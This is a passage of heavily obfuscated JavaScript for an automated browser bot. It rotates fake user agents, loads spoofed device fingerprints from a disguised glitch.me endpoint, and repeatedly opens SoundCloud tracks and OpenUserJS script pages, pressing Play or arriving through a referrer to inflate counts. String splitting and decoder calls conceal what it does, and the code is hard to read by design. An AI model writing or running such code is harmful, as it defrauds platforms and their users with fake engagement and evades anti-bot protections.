      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/sisyphu' + 's?si=2646e' + 'cb7ea704ba' + '68ea2711d1' + '659e92a&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/knots?s' + 'i=c127f344' + 'b3d34c9ca8' + 'e3d7cb4679' + '18f7&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + a0(0x2, 'yCX7') + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/sadfros' + 'ty/beavis-' + 'butthead?s' + 'i=289d5c98' + 'ab0142b982' + '8ef6d51245' + 'b690&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/tyler-w' + 'allace-62/' + 'legacy-emi' + 'nem-remix-' + '1?si=8789c' + '4ffc202403' + 'bb58d7a49a' + '59ee589&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + Z(0x8) + 'cial_shari' + 'ng'
    ],
    'oujsToAssist': [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + Z(0xf) + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a1(0x13) + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      a0(0x5, '&A!2') + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    'oujsUAs': [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      Z(0x7) + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + a0(0x10, 'B7m[') + '6\x20Edg/108.' + '0.1462.54'
    ]
  },
  HookManager = {
    'prototypes': () => {
      Array['prototype']['repeatExte' + 'nd'] = function(g) {
        let h = this,
          i = h;
        for (let j = 0x1 * -0x2330 + -0xc92 + -0x17e1 * -0x2; j < g; j++)
          i = i['concat'](h);
        return i;
      }, Array['prototype']['random'] = function() {
        return this[floor(random() * this['length'])];
      };
      const f = new Map();
      Array['prototype']['randomFlus' + 'h'] = function(g) {
        let h = this[floor(random() * this['length'])];
        f['has'](g) || f['set'](g, new Set());
        const i = f['get'](g);
        for (; i['has'](h);)
          i['size'] === this['length'] && i['clear'](), h = this[floor(random() * this['length'])];
        return i['add'](h), h;
      };
    }
  };
HookManager['prototypes']();

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1da6 + -0x22 + -0x1d84);
    let h = e[f];
    return h;
  }, d(b, c);
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1da6 + -0x22 + -0x1d84);
    let h = e[f];
    if (c['ZDWEEl'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x21c5 + 0x3 * -0x108 + -0x1ead * 0x1, r, s, t = -0x19b5 + -0x14f9 + -0x19 * -0x1de; s = m['charAt'](t++); ~s && (r = q % (-0xbe + 0x9f7 + -0x1 * 0x935) ? r * (0x1 * -0xf85 + -0x1a0d + -0x1 * -0x29d2) + s : s, q++ % (-0x1e2d + 0x111 + 0x1d20)) ? o += String['fromCharCode'](-0x31e * 0x4 + -0x1a06 + 0xb * 0x397 & r >> (-(-0x139 + 0x26ac + -0x2571) * q & 0x1d7 * -0xd + 0x56 + 0x179b * 0x1)) : -0x58 * -0x39 + -0x1 * 0x641 + -0x5 * 0x2ab) {
          s = n['indexOf'](s);
        }
        for (let u = 0x1 * -0x7b0 + 0x1226 + -0xa76, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x22f + 0x1f29 + -0x2148))['slice'](-(0x18e9 + -0xfc7 * -0x2 + -0x3875));
        }
        return decodeURIComponent(p);
      };
      c['imqXZl'] = i, b = arguments, c['ZDWEEl'] = !![];
    }
    const j = e[0x1 * -0x2330 + -0xc92 + -0x17e1 * -0x2],
      k = f + j,
      l = b[k];
    return !l ? (h = c['imqXZl'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const actions = [
  [
    () => flags['ActivateBr' + 'owser'],
    async () => {
      async function f(o = '', p = 0xa22 + -0x1afc + 0x10db * 0x1, q) {
        const u = await q['waitForSel' + 'ector'](o);
        return await m['simClickEl' + 'ement'](u, {
          'pauseAfterMouseUp': p
        }), u;
      }
      log('index.js\x20c' + 'alled');
      const {
        FakeBrowser: g
      } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new g['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1232 + 0xb * 0x1fa + -0x38b)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
        'blockTrackers': 0x1,
        'blockTrackersAndAnnoyances': 0x1
      })])['userDataDi' + 'r'](i);
      let k;
      r:
        for (;;)
          try {
            let o = await async function p() {
              let q;
              const r = {
                'User-Agent': q['userAgents']['random'](),
                'Accept-Encoding': 'none'
              };
              try {
                q = (await axios['get']('https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc', {
                  'headers': r
                }))?.['data'];
              } catch (u) {}
              if (q)
                try {
                  q = (await axios['get'](q, {
                    'headers': r
                  }))?.['data'];
                } catch (v) {}
              if (!q)
                return await randomWait(), await p();
              try {
                return 'object' == typeof q ? q : 'string' == typeof q ? JSON['parse'](q) : {};
              } catch (w) {
                if (!q)
                  return await randomWait(), await p();
              }
            }();
            flags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](o), k = await j['launch']();
            break r;
          } catch (q) {
            warn(q), await randomWait();
          }
      const {
        vanillaBrowser: l,
        userAction: m
      } = k, n = await l['createInco' + 'gnitoBrows' + 'erContext']();
      log('browser\x20la' + 'unched'), flags['RPL2_GF'] && setTimeout(async () => {
        async function r() {
          const s = await l['createInco' + 'gnitoBrows' + 'erContext']();
          if (flags['RPL2_SC2'] && Math['random']() >= -0x20e9 * 0x1 + 0x2 * -0x196 + 0x2415 + 0.3) {
            const u = await s['newPage']();
            let v = 0x26 * -0x37 + -0xf63 + 0x1 * 0x178d;
            if (await u['goto'](data['soundcloud' + 'Tracks']['random'](), {
                'timeout': NETWORK_PATIENCE
              })['catch'](w => v++), v)
              return await u['close'](), await s['close'](), createPage();
            try {
              await u['evaluate'](() => {
                let x = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
                x && 'Play' === x['textConten' + 't'] && (x['id'] = '______hook' + '5');
              });
              let w = await u['$']('#______hoo' + 'k5');
              w && await f('#______hoo' + 'k5', 0x139b + -0x68e + -0x4 * 0x343, u), await wait(0x25 * -0x3b9 + -0x106b8 + -0x1 * -0x2403d + getRandomInt(-0x5c47 + 0x9 * 0x50d + 0x696a, -0x15c5 * 0x7 + -0x6a59 + 0x177ec));
            } catch (x) {}
            return await u['close'](), await s['close'](), createPage();
          } {
            const {
              url: y,
              preRef: z
            } = data['scriptTarg' + 'ets']['randomFlus' + 'h'](0x1163 * 0x2 + 0x156 * -0x4 + -0x1d6d), A = await l['createInco' + 'gnitoBrows' + 'erContext'](), B = await A['newPage']();
            let C = -0x26c5 + -0x2d8 * -0xb + 0x77d;
            if (await B['goto'](z, {
                'timeout': NETWORK_PATIENCE
              })['catch'](E => C++), C)
              return await B['close'](), await A['close'](), r();
            const D = await B['evaluate']('!document.' + 'documentEl' + 'ement.inne' + 'rHTML.incl' + 'udes(\x22scri' + 'pt-descrip' + 'tion\x22);');
            return D ? (await B['close'](), await A['close'](), r()) : (await B['goto'](y, {
              'timeout': NETWORK_PATIENCE
            })['catch'](E => C++), C ? (await B['close'](), await A['close'](), r()) : (await new Promise(E => setTimeout(E, 0xbfe + 0x1e57 + -0x2285 + floor((-0x2b3 * 0x8 + -0x49 * -0x19 + 0x125f) * random()))), await B['evaluate'](() => {
              var E, F, G, H, I, J, K, L, M = 'object' == typeof window ? window : {},
                N = !M['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
              N && (M = global), E = ('0123456789' + 'abcdef')['split'](''), F = [
                -(-0xba8f988a + 0x76 * 0x13d7578 + 0x4a * 0x245fe19),
                -0xff4f3 + -0xac3b76 + 0x7b641 * 0x29,
                -0xd * -0x263 + 0x7201 + -0x1108,
                -0x2 * -0x742 + -0x1f1e + 0x111a
              ], G = [
                -0x1a7a + 0x268a + -0xbf8,
                -0x3 * 0x9b9 + -0xa2e * -0x2 + 0x8df,
                0x1522 + 0x232 + 0x7 * -0x354,
                -0x1 * -0x18db + -0x1 * -0x28d + -0xdb4 * 0x2
              ], H = [
                'hex',
                'array',
                'digest',
                'arrayBuffe' + 'r'
              ], I = [], J = function(R) {
                return function(S) {
                  return new O(0xb98 + 0x5cb * 0x1 + -0x37a * 0x5)['update'](S)[R]();
                };
              }, K = function() {
                var R, S, T = J('hex');
                for (N && (T = L(T)), T['create'] = function() {
                    return new O();
                  }, T['update'] = function(U) {
                    return T['create']()['update'](U);
                  }, R = 0x778 + 0x427 * -0x3 + 0x4fd; R < H['length']; ++R)
                  S = H[R], T[S] = J(S);
                return T;
              }, L = function(R) {
                var S = eval('require(\'crypto\');'),
                  T = eval('require(\'buffer\')[\'Buffer\'];'),
                  U = function(V) {
                    if ('string' == typeof V)
                      return S['createHash']('sha1')['update'](V, 'utf8')['digest']('hex');
                    if (V['constructo' + 'r'] === ArrayBuffer)
                      V = new Uint8Array(V);
                    else {
                      if (void(0xdd9 * -0x1 + 0x851 + 0x588) === V['length'])
                        return R(V);
                    }
                    return S['createHash']('sha1')['update'](new T(V))['digest']('hex');
                  };
                return U;
              };
              class O {
                constructor(R) {
                    R ? (I[-0x2f * -0x5e + -0x5 * 0x6f4 + 0x1182] = I[0x1b94 + 0x1 * -0xf81 + -0xc03] = I[-0xb45 + 0x92 + 0xab4] = I[-0x1223 * -0x1 + 0x71 * -0x11 + 0x8 * -0x154] = I[-0x382 + 0x1932 + -0xb3 * 0x1f] = I[0x1 * 0x33b + 0x45f + -0x796] = I[-0x11b1 + -0x1833 + 0x29e9] = I[0x1 * 0x1a97 + -0x2 * -0x232 + -0x1ef5] = I[0xda * 0x22 + 0xe3f + 0x2 * -0x1596] = I[0x54f + 0x1 * 0x24e + 0x287 * -0x3] = I[-0x2376 + 0x85a + 0x1b25] = I[-0x3 * -0x323 + -0x20b5 + 0x1756] = I[0xf4 + -0x18d * 0x1 + 0x52 * 0x2] = I[-0x1b58 + -0x4f * -0x35 + 0xb09] = I[-0x508 + 0x35a + 0x1bb] = I[0x61 * 0x4f + -0x3a * -0x39 + -0x2acb] = I[-0x7f8 + -0x2395 + 0x2b9c] = -0x1 * 0x1b43 + -0x13 * 0x43 + 0x203c, this['blocks'] = I) : this['blocks'] = [
                      -0x205a + 0x85 + 0x1fd5 * 0x1,
                      0x1bf4 + -0x2 * 0x8d0 + -0xa54,
                      -0x3b * -0x44 + 0x1a6 * 0xe + -0x26c0,
                      -0xda0 + 0x1186 * 0x2 + -0x156c,
                      0x1 * -0x157f + -0x1c4f + 0x31ce,
                      0x1b02 + 0x1182 + -0x2c84,
                      0xa57 + 0x1 * -0x9c9 + -0x8e,
                      -0x8ec * 0x2 + 0x3b * -0x7c + 0x2 * 0x1736,
                      -0x15ed * 0x1 + -0x121f + 0x280c,
                      -0x684 * 0x1 + -0x10 * -0xdb + -0x72c,
                      0x1 * -0x2128 + -0x136e + -0x6a * -0x7f,
                      -0x40d + 0x105 * 0x6 + -0x211 * 0x1,
                      -0x988 + 0x166b + -0xce3,
                      0x1 * 0x1e38 + -0x1825 * -0x1 + -0x3 * 0x121f,
                      0x437 + 0x4d * -0x40 + 0x503 * 0x3,
                      -0x12c7 + -0x1 * -0x7bb + 0xb0c,
                      0x1561 + 0x603 + -0x1b64
                    ], this['h0'] = 0x1843c * -0x4aff + 0x28a * -0x791ea + 0xec39aee9, this['h1'] = 0x15f476907 * 0x1 + 0xf990ab92 + 0x1690a6910 * -0x1, this['h2'] = -0x9ec759e6 + -0x107ff * 0xf5b1 + 0x1238c46d * 0x1f, this['h3'] = 0x78e4b * -0x397 + -0x35f03db * -0x5 + 0x4 * 0x69dc41b, this['h4'] = 0x69e621 + -0xd * 0x71da012 + 0x11fea1cb9, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x179b * -0x1 + -0x1761 + -0x3a, this['finalized'] = this['hashed'] = 0x10c0 * 0x2 + 0x1117 * -0x1 + -0x1069, this['first'] = 0xe * 0x291 + 0x7 * 0x51b + -0x47aa;
                  }
                  ['update'](R) {
                    var S, T, U, V, W, X;
                    if (!this['finalized']) {
                      for ((S = 'string' != typeof R) && R['constructo' + 'r'] === M['ArrayBuffe' + 'r'] && (R = new Uint8Array(R)), U = 0xd * -0x25c + 0x1a17 + -0x17 * -0x33, W = R['length'] || -0x1 * -0x179f + 0x2 * 0x10f5 + -0x3989, X = this['blocks']; U < W;) {
                        if (this['hashed'] && (this['hashed'] = 0x12 * -0x1a3 + -0xad1 + -0x1eb * -0x15, X[-0x15df + 0x181f + -0x240] = this['block'], X[-0x2 * -0xe2c + 0xd01 * 0x3 + -0x7 * 0x99d] = X[-0x1561 + 0x1 * 0xaac + -0x1 * -0xab6] = X[-0x259f + -0x1af1 + 0xbe * 0x57] = X[-0x12 * 0x86 + 0x175c + -0xded] = X[-0x1f31 + -0x13b8 + 0x32ed] = X[0x925 * -0x1 + 0x174a + 0x388 * -0x4] = X[0xb89 + 0x2 * 0x2ea + -0x1157] = X[0xd11 + -0xaab * 0x1 + -0x25f] = X[-0x159b * 0x1 + 0xda7 + 0x4 * 0x1ff] = X[-0xc74 + 0x40b + 0x872] = X[0x155c + -0x21f1 + 0xc9f] = X[0x1590 + -0x1a85 + -0x100 * -0x5] = X[-0xd4b * 0x2 + -0xf1f + 0x29c1] = X[0x11f4 * -0x1 + 0xe * -0x114 + 0x2119] = X[-0xbc6 * -0x1 + -0x9 * 0xc7 + -0x3 * 0x193] = X[-0x20c * -0x3 + -0x4c7 + 0x14e * -0x1] = 0x5 * -0x5a3 + -0x1f94 + -0x3bc3 * -0x1), S) {
                          for (V = this['start']; U < W && V < 0x2013 + 0x5a0 + 0x1 * -0x2573; ++U)
                            X[V >> 0x8b3 + -0xf6 * -0x7 + -0xf6b * 0x1] |= R[U] << G[-0x4 * 0x3c4 + 0x8 * 0xbf + -0x9 * -0x103 & V++];
                        } else {
                          for (V = this['start']; U < W && V < 0xa6a + -0x1339 * -0x1 + 0x1 * -0x1d63; ++U)
                            (T = R['charCodeAt'](U)) < -0x62f * -0x5 + -0x19fc + -0x46f ? X[V >> 0x1679 + -0x25f9 + -0x1 * -0xf82] |= T << G[0x299 + -0x6f * -0x59 + -0x292d & V++] : T < -0x2532 + 0x485 + -0x75 * -0x59 ? (X[V >> -0x2 * -0x193 + -0x25bd + 0x2299] |= (0xa7 * 0x1 + 0x1e2 + -0x1c9 | T >> 0x17db + -0x129b * -0x2 + -0x3d0b) << G[0x1a20 + 0x1 * 0x118c + -0x2ba9 & V++], X[V >> 0x397 * 0x7 + 0x1fdc * 0x1 + -0x38fb] |= (0x188f * -0x1 + 0xb6 * 0x7 + -0x1 * -0x1415 | -0x5f3 * -0x5 + -0xc2 + -0x11b * 0x1a & T) << G[-0x1cea + 0x8 * -0x41 + 0x1ef5 & V++]) : T < 0xd * 0x1580 + -0x1019f + 0xc21f || T >= -0x48c4 * 0x4 + -0x9d * -0x96 + 0x1a712 ? (X[V >> -0x2b * -0x95 + 0x1574 + 0x2e79 * -0x1] |= (0x4cf * -0x1 + 0x1 * 0xd28 + -0x779 | T >> 0x1a1b + -0x3 * 0x2b6 + -0x11ed) << G[0x2226 + 0x1df8 + -0x401b & V++], X[V >> -0x217d + -0x55 * 0x3a + 0x34c1] |= (0x2682 + -0xac8 + -0x1b3a | T >> 0x163d + -0x2479 + 0x2da * 0x5 & 0x7c * 0x1d + -0x2 * 0x233 + 0x1 * -0x967) << G[-0x121f + 0xd03 * -0x1 + 0x77 * 0x43 & V++], X[V >> -0xd02 + 0xe20 + 0x47 * -0x4] |= (0x1c5 * 0x3 + 0x1 * -0x412 + 0x1 * -0xbd | 0x329 * -0x5 + -0xa2f * -0x3 + 0x1 * -0xe81 & T) << G[-0x1 * -0x196 + 0x3a3 * 0x2 + -0x8d9 & V++]) : (T = 0x1a06d * 0x1 + 0xb6c1 + -0x1572e + ((-0x191 * 0x13 + 0x98e + -0x4 * -0x60d & T) << 0x5 * 0x177 + 0x1 * -0x142f + 0xce6 | 0x711 * -0x1 + -0x5d1 * 0x1 + 0x10e1 & R['charCodeAt'](++U)), X[V >> 0x56a + -0x989 + 0x421 * 0x1] |= (-0xda3 + -0x1 * -0x2671 + -0x82 * 0x2f | T >> 0x1 * 0x11b9 + 0x129c + 0x1 * -0x2443) << G[-0x2113 + -0x9 * -0x2b9 + 0x895 & V++], X[V >> 0x1bc + 0x53e + -0x37c * 0x2] |= (-0xb6d + 0x1daa + 0x13 * -0xef | T >> 0x12d + 0x11b * 0x11 + -0x13ec & -0x951 + 0x1796 + -0x167 * 0xa) << G[-0x59d + 0x1cce + -0x172e & V++], X[V >> 0x52b + -0x1 * 0x20aa + 0x3 * 0x92b] |= (0x6 * -0x2bf + 0x22aa + -0x11b0 | T >> -0x218a + -0x33b + 0x24cb & -0x1722 + -0x41f * 0x1 + 0x1b80) << G[-0x21ab + 0x232b + 0x3 * -0x7f & V++], X[V >> 0x1777 + 0x17f2 + -0x97b * 0x5] |= (0x1607 + 0x122b + -0x27b2 | 0xbf2 + -0x6b * 0x12 + -0x42d & T) << G[0xa9 * -0x27 + -0x8b1 + 0x1 * 0x2273 & V++]);
                        }
                        this['lastByteIn' + 'dex'] = V, this['bytes'] += V - this['start'], V >= -0x1b4 * -0x16 + 0x1682 + -0x3bba ? (this['block'] = X[0x1 * 0x1352 + 0x1575 + -0x28b7], this['start'] = V - (0x190c + 0x1c * 0x151 + -0x3da8), this['hash'](), this['hashed'] = 0x1850 + -0x1bdf * 0x1 + -0x2 * -0x1c8) : this['start'] = V;
                      }
                      return this['bytes'] > 0x15ed305 * 0x4c + -0x976dcbf8 + 0x12f47267b && (this['hBytes'] += this['bytes'] / (-0x1ee043304 + 0x11ac0d7c + -0x6 * -0x7a0eb0ec) << 0x2040 + -0xeb7 * -0x2 + -0xc56 * 0x5, this['bytes'] = this['bytes'] % (-0xe35f124 * 0x3 + 0x6e32e1e4 + 0xbc6ef188)), this;
                    }
                  }
                  ['finalize']() {
                    const a2 = d;
                    if (!this['finalized']) {
                      this['finalized'] = 0x8 * 0x10c + 0x7c9 * 0x3 + -0x1fba;
                      var R = this[a2(0x9)],
                        S = this['lastByteIn' + 'dex'];
                      R[-0x5 * -0x57a + 0x1 * 0x1c5e + -0x37b0] = this['block'], R[S >> -0x4a8 * 0x1 + 0x1579 + -0x14b * 0xd] |= F[0x74 + 0x1 * -0x1dc1 + 0x1d50 & S], this['block'] = R[-0x1 * 0x1a50 + -0x2654 + 0x2 * 0x205a], S >= 0x2142 + -0x4 * 0x49d + -0xe96 && (this['hashed'] || this['hash'](), R[-0x2058 + 0x3 * 0x395 + 0x1599] = this['block'], R[-0x13d9 * -0x1 + 0xc36 + -0x1fff] = R[-0x13bc + -0x634 * 0x1 + -0x1 * -0x19f1] = R[-0x792 + -0x19e5 + 0x13 * 0x1c3] = R[0xd * -0x8d + 0x9 * 0x35f + -0x172b] = R[-0x227c + 0x26e9 + -0x469] = R[0x7f0 * 0x4 + -0x87e + -0x173d] = R[0x1609 + -0xa9c + 0x1a1 * -0x7] = R[-0x396 + -0x11 * -0x2b + 0x1 * 0xc2] = R[-0x95 * -0x1b + -0x63 * 0xe + -0xa45] = R[-0x63 + 0xd * 0x23 + -0x15b] = R[0x26d6 + -0x1dbb + -0x911] = R[0x89 * -0x2b + 0x1 * 0x2533 + 0xd5 * -0x11] = R[-0x1c2c + -0x26dd * -0x1 + 0x6d * -0x19] = R[-0x1a2e + 0x1c2f + -0xfa * 0x2] = R[0x1a02 * 0x1 + -0x20c9 + 0x6d5] = R[0x167 * 0xd + 0x1d44 * -0x1 + 0xb18] = -0x241 * 0x8 + -0x1e4b + -0x59 * -0x8b), R[0x2273 * -0x1 + -0xe9 * -0x29 + 0x5 * -0x90] = this['hBytes'] << 0x1 * -0xe1d + 0x13f * -0x2 + 0x6 * 0x2c5 | this['bytes'] >>> -0x1 * -0x1c09 + -0x13 * -0x14f + -0x1 * 0x34c9, R[0x3 * 0x878 + 0x1 * 0x8db + 0x88d * -0x4] = this['bytes'] << -0x914 + -0x100 + 0xa17, this['hash']();
                    }
                  }
                  ['hash']() {
                    var R, S, T = this['h0'],
                      U = this['h1'],
                      V = this['h2'],
                      W = this['h3'],
                      X = this['h4'],
                      Y = this['blocks'];
                    for (R = 0x48 * -0x2f + -0x26bf + -0x1 * -0x3407; R < -0x1 * -0x1d12 + 0xec6 + -0x8 * 0x571; ++R)
                      S = Y[R - (-0x17b7 + -0x1 * 0x40d + -0x223 * -0xd)] ^ Y[R - (-0x838 + -0x1efe + 0x273e)] ^ Y[R - (0xed * -0x1a + -0x1800 + 0x3020)] ^ Y[R - (-0x4a * -0xa + 0x229c + -0x2570)], Y[R] = S << -0x1157 + 0x254a * -0x1 + 0x36a2 | S >>> 0x25 * 0x27 + 0x1ca6 + 0x2 * -0x1115;
                    for (R = 0x1 * -0x13df + -0x2 * 0x115f + 0x369d; R < 0x16a1 + -0x8 * 0x43f + 0xb6b; R += -0x770 * 0x1 + 0x1 * 0x9ad + -0x238)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << -0x2e7 * 0xb + -0x1f1 * 0x3 + -0x25c5 * -0x1 | T >>> -0x1 * -0x101e + -0x59d + 0x16 * -0x79) + (U & V | ~U & W) + X + (-0x8eabb5c * 0x9 + -0x4 * -0x3c5a367 + -0x3b45 * -0x2a065) + Y[R] << -0x219 * -0x2 + 0x1159 + -0x158b * 0x1) << 0x77 + 0x1e55 + -0x1ec7 | X >>> -0xe * -0x28c + -0x1dce + -0x5bf) + (T & (U = U << 0x174a + -0x1b46 + 0x96 * 0x7 | U >>> 0x6d * 0x13 + 0x4 * 0x122 + 0x1 * -0xc9d) | ~T & V) + W + (-0x5942b74e * -0x2 + -0x1d * -0x45636d + -0x5fdf385c) + Y[R + (0xcfd + -0xcf1 + -0x1 * 0xb)] << -0x1c * -0x5 + 0x6d * 0x4 + 0x48 * -0x8) << 0xf06 * 0x1 + -0x1c17 + 0x86 * 0x19 | W >>> 0x1b14 + -0xa97 + 0x1d2 * -0x9) + (X & (T = T << -0x21b3 * 0x1 + 0x1454 + 0xd7d * 0x1 | T >>> -0x258d * -0x1 + 0x1a4b + -0x2 * 0x1feb) | ~X & U) + V + (-0x9e763df7 * 0x1 + 0x3a3995af + 0xbebf21e1) + Y[R + (-0x649 * 0x1 + -0x14d + 0xf3 * 0x8)] << 0x2 * -0x12b7 + -0x1309 * -0x1 + 0x115 * 0x11) << 0x198a + -0x746 + 0xad * -0x1b | V >>> -0x1 * 0xe7d + 0x23ec + -0x1554) + (W & (X = X << -0x12dc + -0x1549 + -0x3a9 * -0xb | X >>> 0xcae + 0x502 * 0x1 + -0x11ae) | ~W & T) + U + (0x9884507 * -0xe + -0x2 * 0x3b226f89 + 0x1563b1f0d) + Y[R + (-0x9 * 0x1d3 + -0xde5 + 0x1e53 * 0x1)] << 0x1f85 + 0x1 * -0x82 + 0x1f03 * -0x1) << 0x24a5 + 0x1 * -0x869 + -0x1c37 | U >>> -0x819 + -0x1 * 0x135d + 0x1b91) + (V & (W = W << 0x26f9 * -0x1 + 0x1 * -0xa6c + 0x3183 | W >>> 0xc17 + 0x84 * -0x10 + -0x3d5) | ~V & X) + T + (-0x77234ef * 0xd + 0xa7a4 * 0x729a + 0x70434914) + Y[R + (0x1a06 + -0x1f71 * 0x1 + 0x56f)] << 0x1924 + 0x672 + -0x2 * 0xfcb, V = V << 0x1ff3 + 0xc38 + -0x9 * 0x4e5 | V >>> 0x33 * 0xb3 + 0x3fe * 0x8 + -0x625 * 0xb;
